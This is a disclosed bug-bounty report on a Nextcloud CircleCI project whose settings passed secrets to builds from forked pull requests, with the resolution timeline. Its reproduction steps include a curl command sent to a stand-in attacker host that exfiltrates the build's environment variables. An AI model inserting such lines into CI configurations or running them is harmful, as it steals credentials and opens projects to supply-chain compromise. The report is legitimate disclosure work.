---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insufficiently-protected-credentials
  - env/web
substate: "resolved"
weakness: "Insufficiently Protected Credentials"
enriched: true
body: true
date: 2021-01-29
submitted: 2020-02-12T11:08:18.357Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "nathand"
source: "https://hackerone.com/reports/794407"
title: "nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets"
---
# nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Nextcloud | **Disclosed:** 2021-01-29

- Report: [https://hackerone.com/reports/794407](https://hackerone.com/reports/794407)
- CWE: Insufficiently Protected Credentials
- Submitted: 2020-02-12T11:08:18.357Z

## Report summary

The techniques and tools I used for finding the insecure configuration detailed in this report can be found on my blog at https://nathandavison.com/blog/shaking-secrets-out-of-circleci-builds.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
CircleCI allows projects to configure whether builds will run as a result of a pull request from a fork, and also whether these fork PRs have access to the secrets stored in the parent repo's CircleCI settings. When both settings are enabled, and the repo associated with the project allows PRs to come from forks from any user (which Github always allows), then a CircleCI project is vulnerable to leaking secrets. Please see the following for documentation on this:

https://circleci.com/docs/2.0/oss/#pass-secrets-to-builds-from-forked-pull-requests

Particularly:

> If you are comfortable sharing secrets with anyone who forks your project and opens a PR, you can enable the Pass secrets to builds from forked pull requests option

I believe the `nextcloud/nextcloud-snap` CircleCI project is configured in a vulnerable state, where both these settings are enabled. To determine this, I have developed an automated technique to query CircleCI projects for various non-sensitive settings including whether secrets are being passed to PRs from forks, although an attacker may be able to determine this by manually inspecting the build logs of fork PRs to the project for signs of credential use, or by simply doing a spray-n-pray, i.e., send in a malicious PR and hope for the best. You can confirm this by accessing the CircleCI dashboard, selecting the `nextcloud/nextcloud-snap` project, clicking on the Settings icon (right side, little cog icon), choosing "Advanced Settings", and scrolling down to "Build forked pull requests" (should be "On") and "Pass secrets to builds from forked pull requests" (should be "On").

Inspecting the `.circleci/config.yml` file for this repo suggests that there may not be any secret values being used, however if you go to a build job such as this one:

https://circleci.com/gh/nextcloud/nextcloud-snap/4537

Then expand the "Preparing Environment Variables" section, and scroll down to "Using environment variables from project settings and/or contexts", you can see that the CircleCI environment has access to `GH_AUTH_TOKEN`, which I'm assuming is a Github auth token. Assuming the worst, and this token grants a high level of access, its exposure using the technique outlined in this report could lead to malicious code being injected into Nextcloud repos, access to private repos etc.

FYI, utilizing CircleCI Contexts may have prevented this configuration from being an issue, however my analysis of the CircleCI config file in this report suggests that Contexts is not being used.

https://circleci.com/docs/2.0/contexts/

**Please note:** I did *not* submit any real pull requests to confirm this vulnerability, as I did not want to potentially tip off real attackers, as it would be hard to conduct a proof of concept in a public PR without also risking revealing the vulnerability. However my testing on CircleCI is fairly conclusive that these two configuration settings being enabled are vulnerable.

With that said, I'm willing to help prove this vulnerability in a more private environment, such as a private Nextcloud Github repository that is configured for CircleCI builds with the same vulnerable configuration outlined in this, which I have access to submit PRs to. The permission model on Github really has no bearing on this vulnerability from what I can tell, so I believe this would be a faithful representation of the vulnerability, without exposing the technique publicly. My Github username is `ndavison` if you wish to do this.

## Steps To Reproduce:

  1. Fork the `nextcloud/nextcloud-snap` repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap).
  1. Create a new branch in the fork, and modify the `.circleci/config.yml` file so environment variables are exfiltrated, e.g. add `- run: curl https://attacker.com/?env=$(env | base64 | tr -d '\n')` to a CircleCI step that is executed during the CI build.
  1. Send the branch in as a PR to `nextcloud/nextcloud-snap`.
  1. Watch the web logs on `attacker.com` and wait for the environment variables stored in the CircleCI `nextcloud/nextcloud-snap` project to arrive via the query string.

## Supporting Material/References:

  * Please see the attached screenshot (`circleci-vulnerable-config.png`) of the vulnerable configuration state (when visiting "Advanced Settings" for a project in the CircleCI dashboard)

## Impact

By abusing the CircleCI configuration for the project, an attacker would be able to leak environment variables, deployment keys, and other credentials stored within the CircleCI project's settings. In this case it looks like the project might have access to a Github access token.

## Timeline

- **Report Filed**
- **2020-02-12** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **Report Resolved**
- **2020-02-17** @nathand: Thanks @nickvergessen - is this one eligible for bounty? I know the CI system is not specifically in scope, but I figured maybe the Github token gave privileged access to a repo that is in scope? FYI a quick way to test this is to run:

```
curl "https://api.github.com/rate_limit" -i -u "user:XXXX" | grep "X-OAuth-Scopes:"
```

Where `XXXX` is the token, and then reference https://developer.github.com/apps/building-oauth-apps/understanding-scopes-for-oauth-apps/ for the details on what scope the token grants. E.g. a scope of `repo` is quite vast but `repo:status` maybe not so much.
- **2020-02-17** @nathand: Sorry forgot to mention, I can confirm the project is now reporting that the "forks receive secrets" is off.
- **Not Eligible For Bounty**
- **2020-02-17** @nathand: Oh sorry, I was not aware of that - but the repo exists under the Nextcloud Github org, and it is possible the token has access beyond just this repo. For instance, if it has the `repo` scope, it would grant read and write to all repos.
- **2020-04-15** @nathand: Hi there - I was just re-reading through this and realized I didn't get a response regarding whether the Github token that would have been exposed here could have impacted on other Nextcloud Github repositories, including those specifically listed as in scope. Is this something that was considered when reviewing this report for bounty eligibility? Thanks.
- **2020-04-15** @nickvergessen: No, it only had access to push to the snap repo
- **2020-04-15** @nathand: @nickvergessen No problems thanks for checking and reporting back.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
